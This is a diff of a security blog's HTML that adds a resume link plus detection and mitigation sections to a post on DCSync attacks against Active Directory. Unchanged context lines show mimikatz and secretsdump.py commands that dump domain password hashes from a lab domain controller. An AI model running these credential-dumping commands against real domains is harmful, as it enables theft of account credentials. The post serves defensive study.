@@ -106,6 +106,12 @@
 			</a>
 		  </li>
 		  
+		  <li>
+			<a href="/about/resume.pdf" title="About me.">
+			  <i class="fa fa-file"></i>Resume
+			</a>
+		  </li>
+		  
 		</ul>
       </div>
     </div> <!-- container -->
@@ -249,6 +255,16 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./mimikatz.exe</span><br><span class="line"></span><br><span class="line"># lsadump::dcsync /domain:&#123;&#125; /user:&#123;domain\targetuser&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h1 id="dcsync-linux-1"><a href="#dcsync-linux-1" class="headerlink" title="dcsync linux"></a>dcsync linux</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/tpetty@172.16.6.3</span><br></pre></td></tr></table></figure>
+
+<h2 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h2><p>To detect DCSync activity, you can monitor the TargetLogonId from Event 4624 and correlate it with other security events tied to the same logon session. DCSync generates a Network Logon type (3) on the DC. By linking Event 4662 (which tracks directory access) with Event 4624 using the LogonId, defenders can identify the source IP of the DCSync request.</p>
+<p><img src="/../images/imasasage.png" alt="alt text"></p>
+<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><p>DCSync attacks exploit replication permissions in Active Directory to extract sensitive credentials, including password hashes. To mitigate this, you must reduce unnecessary replication rights, protect high-privilege accounts, monitor for suspicious activity, and harden your domain infrastructure.</p>
+<p>Mitigation Steps:</p>
+<p>Limit replication rights<br>Only Domain Controllers and essential admin accounts should have replication privileges. Audit and remove unnecessary permissions.</p>
+<p>Monitor for DCSync behavior<br>Detect suspicious replication attempts by monitoring security logs and using threat detection tools.</p>
+<p>Protect privileged accounts<br>Restrict and monitor Domain Admins. Use tiered admin models and Protected Users group where possible.</p>
+<p>Regularly audit privileged access<br>Frequently review permissions and group memberships. Remove outdated accounts and rotate credentials.</p>
+
 	  <div class="article-footer-copyright">
 
 </div>
